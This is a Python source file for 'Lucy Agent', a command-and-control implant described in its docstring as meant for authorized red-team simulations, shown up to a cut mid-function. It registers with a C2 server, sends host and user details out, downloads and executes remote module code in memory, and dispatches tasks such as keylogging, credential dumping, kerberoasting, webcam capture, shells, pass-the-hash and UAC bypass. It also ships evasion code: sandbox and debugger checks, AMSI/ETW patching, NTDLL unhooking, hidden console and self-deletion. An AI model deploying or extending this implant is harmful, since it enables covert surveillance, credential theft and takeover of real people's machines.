"""
Lucy Agent — Standalone implant for authorized Red Team simulations.
Runs with stdlib only; cryptography/pycryptodome required for crypto layer.
No files written to disk unless explicit file.write task received.
"""
import base64
import configparser
import io
import json
import logging
import os
import platform
import random
import socket
import sys
import threading
import time
import urllib.error
import urllib.request
import uuid
from typing import Optional

# ---------------------------------------------------------------------------
# Logging — stderr only, no file handlers
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.WARNING,
    format="%(asctime)s %(levelname)s %(message)s",
    stream=sys.stderr,
)
logger = logging.getLogger("lucy_agent")

# ---------------------------------------------------------------------------
# Default hardcoded config (overridden by .ini if present)
# ---------------------------------------------------------------------------

DEFAULT_CONFIG = {
    "c2_url": "http://127.0.0.1:8000",
    "ws_url": "ws://127.0.0.1:8000",
    "api_key": "",
    "heartbeat_min": 15,
    "heartbeat_max": 30,
    "task_timeout": 60,
    "use_websocket": True,
    "verify_ssl": False,
    "proxy": "",
    # Transport selection: "websocket" | "http" | "dns" | "smb" | "tcp"
    "transport": "websocket",
    # Malleable C2 profile name (loaded from core.malleable)
    "c2_profile": "http_default",
    # DNS beacon settings (when transport=dns)
    "dns_domain": "",
    "dns_server": "",
    # TCP beacon settings (when transport=tcp)
    "tcp_host": "",
    "tcp_port": 4444,
    # SMB pipe settings (when transport=smb)
    "smb_pipe_name": "lucy_pipe",
    # EDR evasion — auto-patch on startup when stealth_pack is True
    "auto_patch_amsi": False,
    "auto_patch_etw": False,
    "auto_unhook_ntdll": False,
    # Sleep mask — encrypt memory between callbacks
    "sleep_mask": False,
    # TLS fingerprint profile
    "tls_profile": "",
    # Stealth
    "stealth_mode": True,
    "stealth_idle_threshold": 60,
    "stealth_active_delay": 5,
    "modules": [],
    "anti_analysis": False,
    "persistence": False,
    "hide_window": True,
    "startup_delay": 0,
    "single_execution": False,
    "self_destruct": False,
    "vm_check": False,
    "debugger_check": False,
    "sandbox_check": False,
    "beacon_jitter": True,
    "max_reconnect": 50,
    "registry_run": False,
    "uac_bypass": False,
    "custom_name": "lucy_agent",
    "ttl_days": 7,
    "expires_at": "",
    "build_id": "",
    "operator_id": "",
    # --- Dormant mode: sleep + wake periodically, optional disk persistence ---
    "dormant_mode": False,
    "dormant_sleep_minutes": 30,
    "dormant_persist": True,
    "auth_hash": "",
}

# ---------------------------------------------------------------------------
# Global state (memory only — never persisted to disk)
# ---------------------------------------------------------------------------

_agent_id: str = ""
_aes_key: bytes = b""
_private_key_pem: bytes = b""
_public_key_pem: bytes = b""
_config: dict = {}
_module_cache: dict[str, dict] = {}
_stop_event = threading.Event()
_stealth_controller: Optional[object] = None
_offline_queue: Optional[object] = None


# ---------------------------------------------------------------------------
# Config loader
# ---------------------------------------------------------------------------


def load_config(ini_path: str = "agent.ini") -> dict:
    config = dict(DEFAULT_CONFIG)
    # 1) Baked-in config from PyInstaller build
    try:
        import config as baked
        baked_map = {
            "c2_url": getattr(baked, "C2_URL", None),
            "ws_url": getattr(baked, "WS_URL", None),
            "api_key": getattr(baked, "API_KEY", None),
            "heartbeat_min": getattr(baked, "HEARTBEAT_MIN", None),
            "heartbeat_max": getattr(baked, "HEARTBEAT_MAX", None),
            "task_timeout": getattr(baked, "TASK_TIMEOUT", None),
            "use_websocket": getattr(baked, "USE_WEBSOCKET", None),
            "verify_ssl": getattr(baked, "VERIFY_SSL", None),
            "proxy": getattr(baked, "PROXY", None),
            "stealth_mode": getattr(baked, "STEALTH_MODE", None),
            "stealth_idle_threshold": getattr(baked, "STEALTH_IDLE_THRESHOLD", None),
            "stealth_active_delay": getattr(baked, "STEALTH_ACTIVE_DELAY", None),
            "modules": getattr(baked, "MODULES", None),
            "anti_analysis": getattr(baked, "ANTI_ANALYSIS", None),
            "persistence": getattr(baked, "PERSISTENCE", None),
            "hide_window": getattr(baked, "HIDE_WINDOW", None),
            "startup_delay": getattr(baked, "STARTUP_DELAY", None),
            "single_execution": getattr(baked, "SINGLE_EXECUTION", None),
            "self_destruct": getattr(baked, "SELF_DESTRUCT", None),
            "vm_check": getattr(baked, "VM_CHECK", None),
            "debugger_check": getattr(baked, "DEBUGGER_CHECK", None),
            "sandbox_check": getattr(baked, "SANDBOX_CHECK", None),
            "beacon_jitter": getattr(baked, "BEACON_JITTER", None),
            "max_reconnect": getattr(baked, "MAX_RECONNECT", None),
            "registry_run": getattr(baked, "REGISTRY_RUN", None),
            "uac_bypass": getattr(baked, "UAC_BYPASS", None),
            "custom_name": getattr(baked, "CUSTOM_NAME", None),
            "ttl_days": getattr(baked, "TTL_DAYS", None),
            "expires_at": getattr(baked, "EXPIRES_AT", None),
            "build_id": getattr(baked, "BUILD_ID", None),
            "operator_id": getattr(baked, "OPERATOR_ID", None),
            "auth_hash": getattr(baked, "AUTH_HASH", None),
            # 2026 options
            "transport": getattr(baked, "TRANSPORT", None),
            "c2_profile": getattr(baked, "C2_PROFILE", None),
            "auto_patch_amsi": getattr(baked, "AUTO_PATCH_AMSI", None),
            "auto_patch_etw": getattr(baked, "AUTO_PATCH_ETW", None),
            "auto_unhook_ntdll": getattr(baked, "AUTO_UNHOOK_NTDLL", None),
            "sleep_mask": getattr(baked, "SLEEP_MASK", None),
            "tls_profile": getattr(baked, "TLS_PROFILE", None),
            # Dormant mode
            "dormant_mode": getattr(baked, "DORMANT_MODE", None),
            "dormant_sleep_minutes": getattr(baked, "DORMANT_SLEEP_MINUTES", None),
            "dormant_persist": getattr(baked, "DORMANT_PERSIST", None),
        }
        for key, val in baked_map.items():
            if val is not None:
                config[key] = val
        return config
    except Exception:
        pass

    # 2) Optional INI fallback for dev/testing
    if os.path.exists(ini_path):
        parser = configparser.ConfigParser()
        parser.read(ini_path)
        if "lucy" in parser:
            s = parser["lucy"]
            for key in DEFAULT_CONFIG:
                if key in s:
                    val = s[key]
                    if isinstance(DEFAULT_CONFIG[key], bool):
                        config[key] = val.lower() in ("1", "true", "yes")
                    elif isinstance(DEFAULT_CONFIG[key], int):
                        config[key] = int(val)
                    else:
                        config[key] = val
    return config


# ---------------------------------------------------------------------------
# Anti-sandbox checks
# ---------------------------------------------------------------------------


def anti_sandbox_check() -> bool:
    """
    Returns True if environment looks like a real machine.
    Returns False if sandbox indicators are detected.
    """
    try:
        # RAM check: < 2 GB is suspicious
        ram_bytes = _get_ram_total()
        if ram_bytes and ram_bytes < 2 * 1024 ** 3:
            logger.warning("Anti-sandbox: low RAM (%d MB)", ram_bytes // (1024 ** 2))
            return False

        # Screen resolution check (Windows)
        if platform.system() == "Windows":
            try:
                import ctypes
                user32 = ctypes.windll.user32
                w = user32.GetSystemMetrics(0)
                h = user32.GetSystemMetrics(1)
                if w < 1024 or h < 768:
                    logger.warning("Anti-sandbox: low screen res %dx%d", w, h)
                    return False
            except Exception:
                pass

        # Debugger detection (Windows)
        if platform.system() == "Windows":
            try:
                import ctypes
                if ctypes.windll.kernel32.IsDebuggerPresent():
                    logger.warning("Anti-sandbox: debugger detected")
                    return False
            except Exception:
                pass

        # Debugger detection (Linux)
        if platform.system() == "Linux":
            try:
                with open("/proc/self/status") as f:
                    for line in f:
                        if line.startswith("TracerPid"):
                            tracer = int(line.split(":")[1].strip())
                            if tracer != 0:
                                logger.warning("Anti-sandbox: tracer PID %d", tracer)
                                return False
            except Exception:
                pass

    except Exception as exc:
        logger.debug("Anti-sandbox check error: %s", exc)

    return True


def _get_ram_total() -> int:
    try:
        import psutil
        return psutil.virtual_memory().total
    except ImportError:
        pass
    try:
        if platform.system() == "Linux":
            with open("/proc/meminfo") as f:
                for line in f:
                    if line.startswith("MemTotal"):
                        return int(line.split()[1]) * 1024
        elif platform.system() == "Windows":
            import ctypes
            class MEMSTATUSEX(ctypes.Structure):
                _fields_ = [("dwLength", ctypes.c_ulong),
                             ("dwMemoryLoad", ctypes.c_ulong),
                             ("ullTotalPhys", ctypes.c_ulonglong),
                             ("ullAvailPhys", ctypes.c_ulonglong),
                             ("ullTotalPageFile", ctypes.c_ulonglong),
                             ("ullAvailPageFile", ctypes.c_ulonglong),
                             ("ullTotalVirtual", ctypes.c_ulonglong),
                             ("ullAvailVirtual", ctypes.c_ulonglong),
                             ("sullAvailExtendedVirtual", ctypes.c_ulonglong)]
            m = MEMSTATUSEX()
            m.dwLength = ctypes.sizeof(m)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m))
            return m.ullTotalPhys
    except Exception:
        pass
    return 0


# ---------------------------------------------------------------------------
# System info collection
# ---------------------------------------------------------------------------


def collect_sysinfo() -> dict:
    info: dict = {}
    info["hostname"] = platform.node()
    info["os"] = platform.system().lower()
    info["os_version"] = platform.release()
    info["architecture"] = platform.machine()
    info["processor"] = platform.processor()

    try:
        info["username"] = os.getlogin()
    except Exception:
        info["username"] = os.environ.get("USER") or os.environ.get("USERNAME", "unknown")

    try:
        info["ip_private"] = socket.gethostbyname(socket.gethostname())
    except Exception:
        info["ip_private"] = "127.0.0.1"

    try:
        import psutil
        vm = psutil.virtual_memory()
        info["ram_total"] = vm.total
        info["ram_available"] = vm.available
    except ImportError:
        ram = _get_ram_total()
        info["ram_total"] = ram
        info["ram_available"] = 0

    return info


# ---------------------------------------------------------------------------
# HTTP helpers (stdlib urllib)
# ---------------------------------------------------------------------------


def _http_request(
    method: str,
    url: str,
    data: dict | None = None,
    headers: dict[str, str] | None = None,
    timeout: int = 30,
) -> dict:
    """Make a signed HTTP request with a benign user agent and optional jitter."""
    if _config.get("beacon_jitter"):
        # Random short delay to desynchronize traffic patterns.
        time.sleep(random.uniform(0.0, 2.0))

    body = json.dumps(data).encode("utf-8") if data else None
    req_headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        # Benign user agent to blend into normal traffic.
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
        ]),
    }
    if headers:
        req_headers.update(headers)
    if _config.get("api_key"):
        req_headers["X-API-Key"] = _config["api_key"]

    req = urllib.request.Request(url, data=body, headers=req_headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            return json.loads(raw.decode("utf-8"))
    except urllib.error.HTTPError as exc:
        raise RuntimeError(f"HTTP {exc.code}: {exc.reason}") from exc
    except Exception as exc:
        raise RuntimeError(f"Request failed: {exc}") from exc


# ---------------------------------------------------------------------------
# ECDH Handshake
# ---------------------------------------------------------------------------


def perform_handshake(sysinfo: dict) -> tuple[str, bytes]:
    """
    Register with C2, perform ECDH handshake.
    Returns (agent_id, aes_key).
    """
    from core.crypto import (
        derive_aes_key,
        derive_shared_secret,
        generate_keypair,
    )

    global _private_key_pem, _public_key_pem

    _private_key_pem, _public_key_pem = generate_keypair()

    payload = {
        **sysinfo,
        "public_key": _public_key_pem.decode("utf-8"),
    }

    base_url = _config["c2_url"].rstrip("/")
    response = _http_request("POST", f"{base_url}/api/v1/agents/register", data=payload)

    agent_id = response["agent_id"]
    server_public_key_pem = response["public_key"].encode("utf-8")
    nonce_b64 = response.get("nonce", "")

    shared_secret = derive_shared_secret(_private_key_pem, server_public_key_pem)
    nonce_bytes = base64.b64decode(nonce_b64) if nonce_b64 else b"lucy"
    aes_key = derive_aes_key(shared_secret, salt=nonce_bytes[:32].ljust(32, b"\x00")[:32])

    logger.info("Handshake complete. Agent ID: %s", agent_id)
    return agent_id, aes_key


# ---------------------------------------------------------------------------
# Module loader (dynamic exec — memory only)
# ---------------------------------------------------------------------------


def load_module(name: str) -> dict | None:
    """
    Check cache first, then download from C2.
    Returns module namespace dict or None on failure.
    """
    if name in _module_cache:
        return _module_cache[name]

    try:
        base_url = _config["c2_url"].rstrip("/")
        resp = _http_request("GET", f"{base_url}/api/v1/modules/{name}/download")
        code = resp.get("code", "")
        version = resp.get("version", "0.0.0")
        signature = resp.get("signature", "")

        if not code:
            logger.error("Module '%s': empty code received", name)
            return None

        namespace: dict = {
            "__name__": f"lucy_module_{name}",
            "__builtins__": __builtins__,
        }
        exec(compile(code, f"<module:{name}>", "exec"), namespace)

        _module_cache[name] = {"namespace": namespace, "version": version}
        logger.info("Module '%s' v%s loaded.", name, version)
        return _module_cache[name]

    except Exception as exc:
        logger.error("Failed to load module '%s': %s", name, exc)
        return None


# ---------------------------------------------------------------------------
# Task execution
# ---------------------------------------------------------------------------


def execute_task(task: dict) -> dict:
    """
    Execute a task in a thread with timeout.
    Returns result dict.
    """
    task_id = task.get("task_id", "")
    module = task.get("module", "")
    action = task.get("action", "run")
    params = task.get("params", {})
    timeout = int(task.get("timeout", _config.get("task_timeout", 60)))

    result_container: list = []
    error_container: list = []

    def _run():
        try:
            # Stealth delay before noisy actions
            if _stealth_controller and _stealth_controller.should_delay(module, action):
                delay = _stealth_controller.adaptive_delay(module, action)
                if delay > 0:
                    logger.info("Stealth: delaying '%s' for %.1fs (user active)", module, delay)
                    time.sleep(delay)

            from modules.builtin import run_builtin, _MODULES
            if module in _MODULES:
                result_container.append(run_builtin(module, action, params))
                return

            _LOCAL_MODULES = {
                "anti_analysis":   "modules.anti_analysis",
                "browser":          "modules.browser",
                "keylog":           "modules.keylog",
                "wifi":             "modules.wifi",
                "screenshot":       "modules.screenshot",
                "shell":            "modules.shell",
                "port_scan":        "modules.port_scan",
                "stealth":          "modules.stealth",
                "pivoting":         "modules.pivoting",
                "credential_dump":  "modules.credential_dump",
                "kerberoast":       "modules.kerberoast",
                "clipboard":        "modules.clipboard",
                "macos":            "modules.macos",
                "webcam":           "modules.webcam",
                "screen_stream":    "modules.screen_stream",
                "remote_control":   "modules.remote_control",
                "persistence":      "modules.persistence",
                # Tier 1 — EDR evasion
                "edr_evasion":      "modules.edr_evasion",
                "syscalls":         "modules.syscalls",
                "sleep_mask":       "modules.sleep_mask",
                "injection":        "modules.injection",
                "stack_spoof":      "modules.stack_spoof",
                # Tier 2 — Post-exploitation
                "lateral":          "modules.lateral",
                "token":            "modules.token",
                "bof":              "modules.bof",
                "pth":              "modules.pth",
                # Tier 3 — Advanced persistence, UAC bypass, TLS fingerprint
                "persistence_adv":  "modules.persistence_adv",
                "uac_bypass":       "modules.uac_bypass",
                "tls_fingerprint":  "modules.tls_fingerprint",
            }
            if module in _LOCAL_MODULES:
                import importlib
                mod_obj = importlib.import_module(_LOCAL_MODULES[module])
                run_fn = getattr(mod_obj, "run", None)
                if callable(run_fn):
                    result_container.append(run_fn(action, **params))
                else:
                    error_container.append(f"Module '{module}' has no run() function")
                return

            mod = load_module(module)
            if mod is None:
                error_container.append(f"Module '{module}' not available")
                return

            ns = mod["namespace"]
            run_fn = ns.get("run") or ns.get(f"{module}_run")
            if not callable(run_fn):
                error_container.append(f"Module '{module}' has no run() function")
                return

            result_container.append(run_fn(action, params))

        except Exception as exc:
            error_container.append(str(exc))

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    t.join(timeout=timeout)

    if t.is_alive():
        return {
            "task_id": task_id,
            "status": "failed",
            "error": f"Timeout after {timeout}s",
            "data": None,
        }

    if error_container:
        return {
            "task_id": task_id,
            "status": "failed",
            "error": error_container[0],
            "data": None,
        }

    result = result_container[0] if result_container else {"status": "completed", "data": None}
    return {
        "task_id": task_id,
        "status": result.get("status", "completed"),
        "data": result.get("data"),
        "error": result.get("error"),
    }


# ---------------------------------------------------------------------------
# Heartbeat (HTTP polling mode)
# ---------------------------------------------------------------------------


def send_heartbeat_http(agent_id: str) -> list[dict]:
    """
    POST heartbeat via HTTP. Returns list of pending tasks.
    """
    try:
        import psutil
        cpu = psutil.cpu_percent(interval=0.2)
        ram = psutil.virtual_memory().available
    except ImportError:
        cpu = 0.0
        ram = 0

    payload = {
        "agent_id": agent_id,
        "cpu": cpu,
        "ram_available": ram,
        "status": "online",
        "stealth_mode": _config.get("stealth_mode", True),
        "activity_indicators": _stealth_controller.get_indicators() if _stealth_controller else {},
    }

    base_url = _config["c2_url"].rstrip("/")
    try:
        resp = _http_request(
            "POST",
            f"{base_url}/api/v1/agents/{agent_id}/heartbeat",
            data=payload,
        )
        if _offline_queue and _offline_queue.result_count() > 0:
            def _send(result: dict) -> None:
                _http_request(
                    "POST",
                    f"{base_url}/api/v1/tasks/{result['task_id']}/result",
                    data=result,
                )
            sent = _offline_queue.flush_results(_send)
            if sent:
                logger.info("Flushed %d queued result(s) to C2", sent)
        return resp.get("tasks", [])
    except Exception as exc:
        logger.warning("Heartbeat failed: %s", exc)
        return []


def send_result_http(agent_id: str, result: dict) -> None:
    base_url = _config["c2_url"].rstrip("/")
    try:
        _http_request(
            "POST",
            f"{base_url}/api/v1/tasks/{result['task_id']}/result",
            data=result,
        )
    except Exception as exc:
        logger.warning("Result send failed: %s — queued offline", exc)
        if _offline_queue:
            _offline_queue.enqueue_result(result)


# ---------------------------------------------------------------------------
# WebSocket mode
# ---------------------------------------------------------------------------


def _handle_input_event(payload: dict, agent_id: str, ws) -> None:
    """
    Handle a remote-control input event from the C2 frontend.
    Dispatches to the remote_control module in a short-lived thread so
    it doesn't block the WS message loop.

    payload format: {action: 'mouse_move'|'key_press'|..., ...kwargs}
    """
    action = payload.get("action", "")
    if not action:
        return

    def _do_input():
        try:
            import importlib
            rc = importlib.import_module("modules.remote_control")
            kwargs = {k: v for k, v in payload.items() if k != "action"}
            result = rc.run(action, **kwargs)
            # Send a lightweight confirmation back (not a full task result)
            try:
                ws.send(json.dumps({
                    "type": "input_result",
                    "agent_id": agent_id,
                    "payload": {"action": action, "status": result.get("status", "completed")},
                }))
            except Exception:
                pass
        except Exception as exc:
            logger.debug("input_event '%s' failed: %s", action, exc)

    # remote_control actions are fast (<50ms) — run in a daemon thread
    t = threading.Thread(target=_do_input, daemon=True, name="rc_input")
    t.start()


def run_websocket_loop(agent_id: str) -> None:
    """
    Persistent WebSocket connection loop with automatic reconnection.
    Falls back to HTTP polling on connection failure.
    Also runs a background HTTP heartbeat to fetch pending tasks
    that were queued while WS was disconnected.
    """
    try:
        import websocket as _ws_lib
    except ImportError:
        logger.warning("websocket-client not available — using HTTP polling")
        run_http_loop(agent_id)
        return

    # Start a background HTTP heartbeat thread to catch pending tasks
    # that were queued while WS was down or between reconnects.
    _ws_reconnect_count = 0
    _ws_connected = threading.Event()
    _ws_connected.set()  # mark as connected initially

    def _http_heartbeat_bg():
        """Background HTTP heartbeat to drain pending tasks.
        Only runs when WS is NOT connected, to avoid interfering with WS."""
        while not _stop_event.is_set():
            # Only do HTTP heartbeat when WS is down
            if not _ws_connected.is_set():
                try:
                    tasks = send_heartbeat_http(agent_id)
                    if tasks:
                        logger.info("HTTP heartbeat fetched %d pending task(s)", len(tasks))
                        for task in tasks:
                            result = execute_task(task)
                            send_result_http(agent_id, result)
                except Exception as exc:
                    logger.debug("Background HTTP heartbeat failed: %s", exc)
            _stop_event.wait(timeout=15)

    bg_thread = threading.Thread(target=_http_heartbeat_bg, daemon=True, name="lucy_http_bg")
    bg_thread.start()

    # Main WS reconnect loop
    while not _stop_event.is_set():
        try:
            _run_ws_with_lib(agent_id, _ws_lib, ws_connected_event=_ws_connected)
        except Exception as exc:
            logger.warning("WS loop error: %s", exc)

        if _stop_event.is_set():
            break

        _ws_reconnect_count += 1
        wait = min(60, 3 * _ws_reconnect_count)
        logger.info("WS disconnected — reconnecting in %ds (attempt %d)", wait, _ws_reconnect_count)
        _stop_event.wait(timeout=wait)
        _ws_reconnect_count = min(_ws_reconnect_count, 10)  # cap


# Active WebSocket reference — used by screen_stream send_fn to push frames
# from the background thread. Set in on_open, cleared in on_close.
_active_ws = None


def _run_ws_with_lib(agent_id: str, ws_lib, ws_connected_event: threading.Event = None) -> None:
    global _active_ws
    ws_base = _config["ws_url"].rstrip("/")
    api_key = _config.get("api_key", "")
    uri = f"{ws_base}/ws/agent/{agent_id}?api_key={api_key}"

    def _send_screen_frame(frame_payload: dict) -> None:
        """Push a screen_frame message to the C2 from the screen_stream thread.

        frame_payload format from screen_stream._stream_loop:
            {type, module, data: <base64 jpeg>, ts}

        Frontend expects: {frame: <base64>, width, height}
        """
        try:
            ws = _active_ws
            if ws is None:
                return
            # Extract the base64 frame and add resolution info
            frame_b64 = frame_payload.get("data", "") if isinstance(frame_payload, dict) else ""
            # Try to get resolution from screen_stream module
            try:
                from modules.screen_stream import _get_resolution
                res = _get_resolution()
            except Exception:
                res = {"width": 1920, "height": 1080}
            ws.send(json.dumps({
                "type": "screen_frame",
                "agent_id": agent_id,
                "payload": {
                    "frame": frame_b64,
                    "width": res.get("width", 1920),
                    "height": res.get("height", 1080),
                    "agent_id": agent_id,
                },
            }))
        except Exception as exc:
            logger.debug("screen_frame send failed: %s", exc)

    def on_message(ws, raw):
        try:
            msg = json.loads(raw)
            msg_type = msg.get("type")
            if msg_type == "task":
                payload = msg.get("payload", {})
                # Pass send_fn to screen_stream so it can push continuous frames
                if payload.get("module") == "screen_stream" and payload.get("action") == "start":
                    payload.setdefault("params", {})
                    payload["params"]["send_fn"] = _send_screen_frame

                # Run task in a separate thread so the WS message loop
                # stays responsive to pings and other messages.
                def _run_task():
                    result = execute_task(payload)
                    try:
                        ws.send(json.dumps({
                            "type": "result",
                            "task_id": result["task_id"],
                            "payload": result,
                        }))
                    except Exception as exc:
                        logger.warning("WS result send failed: %s — queued offline", exc)
                        if _offline_queue:
                            _offline_queue.enqueue_result(result)
                        # Fallback: try HTTP
                        try:
                            send_result_http(agent_id, result)
                        except Exception:
                            pass

                t = threading.Thread(target=_run_task, daemon=True, name="lucy_task")
                t.start()

            elif msg_type == "input_event":
                # Remote desktop input — dispatch to remote_control module
                payload = msg.get("payload", {})
                _handle_input_event(payload, agent_id, ws)
            elif msg_type == "ping":
                logger.debug("Server ping — sending pong")
                ws.send(json.dumps({"type": "pong"}))
            elif msg_type == "module_response":
                _cache_module_from_ws(msg.get("payload", {}))
        except Exception as exc:
            logger.error("WS message handling error: %s", exc)

    def on_open(ws):
        global _active_ws
        _active_ws = ws
        if ws_connected_event:
            ws_connected_event.set()
        logger.info("WS connected.")
        try:
            _send_ws_heartbeat(ws, agent_id)
        except Exception as exc:
            logger.warning("WS initial heartbeat failed: %s", exc)
        if _offline_queue and _offline_queue.result_count() > 0:
            def _send(result: dict) -> None:
                ws.send(json.dumps({
                    "type": "result",
                    "task_id": result["task_id"],
                    "payload": result,
                }))
            try:
                sent = _offline_queue.flush_results(_send)
                if sent:
                    logger.info("Flushed %d queued result(s) over WS", sent)
            except Exception as exc:
                logger.warning("WS offline flush failed: %s", exc)

    def on_error(ws, error):
        logger.warning("WS error: %s", error)

    def on_close(ws, code, msg):
        global _active_ws
        _active_ws = None
        if ws_connected_event:
            ws_connected_event.clear()
        logger.info("WS closed (code=%s, msg=%s).", code, msg)

    def _heartbeat_thread(ws):
        while not _stop_event.is_set():
            interval = random.randint(
                _config["heartbeat_min"], _config["heartbeat_max"]
            )
            if _config.get("stealth_mode") and _stealth_controller and _stealth_controller.user_is_active:
                interval = int(interval * 1.5)
            time.sleep(interval)
            if not _stop_event.is_set():
                _send_ws_heartbeat(ws, agent_id)

    ws_app = ws_lib.WebSocketApp(
        uri,
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close,
    )
    # Aggressive ping to keep connection alive — ping every 10s, timeout 5s
    ws_app.run_forever(ping_interval=10, ping_timeout=5,
                       ping_payload="lucy-ping")


def _send_ws_heartbeat(ws, agent_id: str) -> None:
    try:
        import psutil
        cpu = psutil.cpu_percent(interval=0.1)
        ram = psutil.virtual_memory().available
    except ImportError:
        cpu = 0.0
        ram = 0

    indicators = _stealth_controller.get_indicators() if _stealth_controller else {}
    ws.send(json.dumps({
        "type": "heartbeat",
        "agent_id": agent_id,
        "payload": {
            "cpu": cpu,
            "ram_available": ram,
            "status": "online",
            "stealth_mode": _config.get("stealth_mode", True),
            "activity_indicators": indicators,
        },
    }))


def _cache_module_from_ws(payload: dict) -> None:
    name = payload.get("name")
    code = payload.get("code", "")
    version = payload.get("version", "0.0.0")
    if name and code:
        namespace: dict = {"__name__": f"lucy_module_{name}", "__builtins__": __builtins__}
        exec(compile(code, f"<module:{name}>", "exec"), namespace)
        _module_cache[name] = {"namespace": namespace, "version": version}
        logger.info("Module '%s' cached from WS.", name)


# ---------------------------------------------------------------------------
# HTTP polling loop
# ---------------------------------------------------------------------------


def run_http_loop(agent_id: str) -> None:
    logger.info("Starting HTTP polling loop.")
    while not _stop_event.is_set():
        try:
            tasks = send_heartbeat_http(agent_id)

            # Drain queued offline tasks first
            while _offline_queue and _offline_queue.task_count() > 0:
                task = _offline_queue.dequeue_task()
                if task:
                    result = execute_task(task)
                    send_result_http(agent_id, result)

            for task in tasks:
                result = execute_task(task)
                send_result_http(agent_id, result)
        except Exception as exc:
            logger.warning("HTTP loop error: %s", exc)

        # --- Sleep mask: encrypt memory during sleep ---
        sleep_mask_active = False
        if _config.get("sleep_mask"):
            try:
                import importlib
                sm = importlib.import_module("modules.sleep_mask")
                r = sm.run("enable")
                sleep_mask_active = r.get("status") == "completed"
            except Exception:
                pass

        interval = random.randint(
            _config["heartbeat_min"], _config["heartbeat_max"]
        )
        if _config.get("stealth_mode") and _stealth_controller and _stealth_controller.user_is_active:
            interval = int(interval * 1.5)
        _stop_event.wait(timeout=interval)

        # --- Wake: decrypt memory ---
        if sleep_mask_active:
            try:
                import importlib
                sm = importlib.import_module("modules.sleep_mask")
                sm.run("disable")
            except Exception:
                pass


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------


def _check_expiry(config: dict) -> bool:
    """Return True if the agent build has not expired."""
    expires_at = config.get("expires_at")
    if not expires_at:
        return True
    try:
        from datetime import datetime, timezone
        # Accept ISO 8601 with or without timezone
        exp = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        if exp.tzinfo is None:
            exp = exp.replace(tzinfo=timezone.utc)
        if datetime.now(timezone.utc) > exp:
            logger.warning("Agent build expired on %s — exiting.", expires_at)
            return False
    except Exception as exc:
        logger.warning("Could not parse expires_at '%s': %s", expires_at, exc)
    return True


def _startup_delay(config: dict) -> None:
    delay = int(config.get("startup_delay", 0))
    if delay > 0:
        logger.info("Startup delay: %ds", delay)
        _stop_event.wait(timeout=delay)


def _self_destruct() -> None:
    """Attempt to remove the running executable from disk."""
    try:
        exe = sys.executable
        if platform.system() == "Windows":
            import subprocess
            script = f"timeout /t 2 > nul && del /f /q \"{exe}\""
            subprocess.Popen(["cmd.exe", "/c", script], shell=False,
                             creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            import subprocess
            subprocess.Popen(["sh", "-c", f"sleep 2 && rm -f \"{exe}\""])
    except Exception as exc:
        logger.warning("Self-destruct failed: %s", exc)


def _hide_console() -> None:
    """Hide the console window on Windows to keep the agent discreet."""
    if platform.system() != "Windows":
        return
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception as exc:
        logger.debug("Could not hide console window: %s", exc)


def _auto_evasion_setup(config: dict) -> None:
    """Auto-patch AMSI/ETW and unhook NTDLL if configured (stealth pack)."""
    if not (config.get("auto_patch_amsi") or config.get("auto_patch_etw")
            or config.get("auto_unhook_ntdll")):
        return

    try:
        import importlib
        evasion = importlib.import_module("modules.edr_evasion")
        if config.get("auto_patch_amsi"):
            result = evasion.run("patch_amsi")
            if result.get("status") == "completed":
                logger.info("AMSI patched successfully.")
            else:
                logger.warning("AMSI patch failed: %s", result.get("error"))
        if config.get("auto_patch_etw"):
            result = evasion.run("patch_etw")
            if result.get("status") == "completed":
                logger.info("ETW patched successfully.")
            else:
                logger.warning("ETW patch failed: %s", result.get("error"))
        if config.get("auto_unhook_ntdll"):
            result = evasion.run("unhook_ntdll")
            if result.get("status") == "completed":
                logger.info("NTDLL unhooked successfully.")
            else:
                logger.warning("NTDLL unhook failed: %s", result.get("error"))
    except Exception as exc:
        logger.debug("Auto-evasion setup failed: %s", exc)


def _apply_tls_profile(config: dict) -> None:
    """Apply TLS fingerprint profile if configured."""
    profile = config.get("tls_profile", "")
    if not profile:
        return
    try:
        import importlib
        tls_mod = importlib.import_module("modules.tls_fingerprint")
        result = tls_mod.run("set_profile", profile=profile)
        if result.get("status") == "completed":
            tls_mod.run("apply_to_agent")
            logger.info("TLS fingerprint profile '%s' applied.", profile)
        else:
            logger.warning("TLS profile '%s' failed: %s", profile, result.get("error"))
    except Exception as exc:
        logger.debug("TLS profile setup failed: %s", exc)


def _select_transport(config: dict, agent_id: str) -> None:
    """Select and run the appropriate beacon transport based on config."""
    transport = config.get("transport", "websocket")

    if transport == "websocket":
        run_websocket_loop(agent_id)
    elif transport == "http":
        run_http_loop(agent_id)
    elif transport == "dns":
        try:
            from core.dns_beacon import DNSBeaconLoop
            loop = DNSBeaconLoop(
                domain=config.get("dns_domain", ""),
                dns_server=config.get("dns_server", ""),
            )
            loop.run(agent_id)
        except ImportError:
            logger.warning("DNS beacon module not available — falling back to HTTP.")
            run_http_loop(agent_id)
    elif transport == "smb":
        try:
            from core.smb_pipe import SMBPipeLoop
            loop = SMBPipeLoop(
                pipe_name=config.get("smb_pipe_name", "lucy_pipe"),
            )
            loop.run(agent_id)
        except ImportError:
            logger.warning("SMB pipe module not available — falling back to HTTP.")
            run_http_loop(agent_id)
    elif transport == "tcp":
        try:
            from core.tcp_beacon import TCPBeaconLoop
            loop = TCPBeaconLoop(
                host=config.get("tcp_host", ""),
                port=int(config.get("tcp_port", 4444)),
            )
            loop.run(agent_id)
